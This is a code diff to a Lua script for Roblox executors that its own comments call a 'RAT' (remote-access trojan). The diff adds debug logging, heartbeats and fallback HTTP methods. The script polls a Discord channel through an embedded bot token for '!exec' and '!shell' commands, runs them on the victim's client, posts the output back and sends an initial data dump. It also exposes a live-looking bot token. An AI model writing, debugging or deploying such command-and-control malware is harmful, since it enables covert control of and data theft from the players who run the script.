@@ -1,5 +1,5 @@
 -- ============================================================
--- SIMPLE RAT – WORKS WITHOUT BOT ID CHECK
+-- DEBUG RAT – With Full Logging
 -- ============================================================
 local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
 local channelID = "1543230748180615198"
@@ -24,18 +24,39 @@ local function sendMessage(content)
     return false
 end
 
--- ========== READ LAST MESSAGE ==========
+-- ========== READ LAST MESSAGE (with full response logging) ==========
 local function getLastMessage()
     local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages?limit=1"
     local headers = {["Authorization"] = "Bot " .. botToken, ["Content-Type"] = "application/json"}
+    -- Try request first
     local ok, res = pcall(request, {Url = url, Method = "GET", Headers = headers})
+    if ok and res and res.Body then
+        local data = game:GetService("HttpService"):JSONDecode(res.Body)
+        if data and #data > 0 then
+            return data[1].content or ""
+        else
+            return nil -- no messages or malformed
+        end
+    end
+    -- Try http_request
+    ok, res = pcall(http_request, {Url = url, Method = "GET", Headers = headers})
     if ok and res and res.Body then
         local data = game:GetService("HttpService"):JSONDecode(res.Body)
         if data and #data > 0 then
             return data[1].content or ""
         end
     end
-    return ""
+    -- Try HttpService:GetAsync (if supported)
+    ok, res = pcall(function()
+        return game:GetService("HttpService"):GetAsync(url, {Headers = headers})
+    end)
+    if ok and res then
+        local data = game:GetService("HttpService"):JSONDecode(res)
+        if data and #data > 0 then
+            return data[1].content or ""
+        end
+    end
+    return nil -- failed
 end
 
 -- ========== EXECUTE COMMANDS ==========
@@ -208,24 +229,36 @@ local function createGUI()
 end
 
 -- ========== MAIN ==========
-sendMessage("```✅ RAT online – waiting for commands (use !exec or !shell)```")
+sendMessage("```🔧 RAT starting – debug mode ON```")
+
+-- Send initial data dump
 sendInitial()
 createGUI()
 
--- Track last message sent to avoid echo
-local lastSent = ""
-local commandPoll = 0
+-- Command polling loop with debug
+local lastMsg = ""
+local loopCount = 0
 while true do
-    task.wait(3)  -- check every 3 seconds
+    task.wait(3)
+    loopCount = loopCount + 1
+    -- Every 10 loops (30 seconds), send a heartbeat to confirm script is alive
+    if loopCount % 10 == 0 then
+        sendMessage("```💓 Heartbeat: Script still running (loop " .. loopCount .. ")```")
+    end
+    
     local msg = getLastMessage()
-    -- Ignore if empty or same as last sent (to avoid self-echo)
-    if msg and msg ~= "" and msg ~= lastSent then
-        -- Check if it's a command
-        if msg:sub(1, 6) == "!exec " or msg:sub(1, 7) == "!shell " then
-            -- Store last sent to avoid echo
+    if msg then
+        -- If we got a message
+        if msg ~= lastMsg and (msg:sub(1,6)=="!exec " or msg:sub(1,7)=="!shell ") then
+            lastMsg = msg
+            sendMessage("```📩 Command detected: " .. msg .. "```") -- debug
             local response = executeCommand(msg)
             sendMessage(response)
-            lastSent = response  -- store the last message we sent (so we don't reply to ourselves)
+        end
+    else
+        -- If getLastMessage returned nil, it failed to fetch messages
+        if loopCount % 5 == 0 then
+            sendMessage("```⚠️ Failed to fetch messages – check permissions and token.```")
         end
     end
 end
